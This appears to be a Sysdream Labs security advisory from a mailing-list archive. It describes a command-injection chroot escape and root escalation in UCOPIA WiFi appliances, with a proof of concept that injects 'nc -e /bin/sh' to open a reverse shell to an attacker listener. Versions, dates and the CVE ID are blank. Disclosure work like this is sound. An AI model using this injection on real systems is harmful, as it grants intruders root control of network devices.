More than UCOPIA solutions are deployed and maintained by UCOPIA expert partners all over the world.  The affected asset in this report is a WiFi management appliance.  ## Vulnerability  CHROOT escape and privileges escalation.  **Threat**  Improper sanitization of system commands in the chroothole_client executable in UCOPIA Wireless Appliance, prior to allows local attackers to elevate privileges to root user and escape from the *chroot*.  **CVE ID**:  **Access Vector**: local  **Security Risk**: high  **Vulnerability**: CWE-78  **CVSS Base Score**: 8.2 (High)  **CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  ### Proof of Concept: chroot escape / privileges escalation  The **chroothole_client** binary is used by the appliance to run programs outside the *chroot*, as the **root** user.  Because of an improper sanitization of system commands, we managed to gain a complete **root** access to the appliance, outside the *chroot*.  ``` $ chroothole_client '/usr/sbin/status' is not running ... failed ! $ chroothole_client '/usr/sbin/status $(which nc)' /bin/nc is not running ... failed! $ chroothole_client '/usr/sbin/status $(nc -e /bin/sh)' ```  Attacker terminal :  ``` $ ncat -lvp Ncat: Listening on Ncat: Connection from whoami root ```  ## Solution  Update to UCOPIA  ## Timeline (dd/mm/yyyy)  * : Vulnerability discovery. * : Initial contact. * : GPG Key exchange. * : Advisory sent to vendor. * : Request for feedback. * : Vendor acknowledge the vulnerabilities. * : Sysdream Labs request for an ETA, warning for public disclosure. * : Vendor say that the UCOPIA fixes the issue. * : Public disclosure.  ## Credits  * Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)  --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream    Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
